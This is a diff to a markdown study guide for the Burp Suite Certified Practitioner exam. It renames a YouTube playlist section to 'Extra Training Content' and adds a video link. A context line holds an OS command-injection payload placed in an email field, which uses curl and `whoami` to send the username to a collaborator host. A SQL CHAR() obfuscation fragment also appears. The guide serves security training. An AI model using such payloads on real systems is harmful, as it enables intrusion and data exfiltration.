@@ -37,7 +37,7 @@
 [Word lists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
 [Focus target scanning](#focus-scanning)  
 [Approach](#approach)  
-[Youtube Study Playlist](#youtube-training-playlist)  
+[Extra Training Content](#extra-training-content)  
 
 [Footnote](#footnote)  
   
@@ -2645,7 +2645,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 [Python Scripts](#python-scripts)  
 [Focus Scanning](#focus-scanning)  
 [Approach](#approach)  
-[YouTube Channels](#youtube-training-playlist)  
+[YouTube & Extra Training Content](#extra-training-content)  
 
 ## Obfuscation  
 
@@ -2732,9 +2732,12 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 
 ![Three stages](images/3stages.png)  
   
-## YouTube Training Playlist 
+## Extra Training Content  
   
-[My YouTube BSCP Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
+>Some great links to YouTube content creators training material and links to study stuff.  
+
+- [My YouTube BSCP Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
+- [Cookies, Sessions, JSON Web Tokens (JWT) Explained](https://youtu.be/uXDnS5PcjCA)  
 
 Youtube Information Security content creators channels:  
 
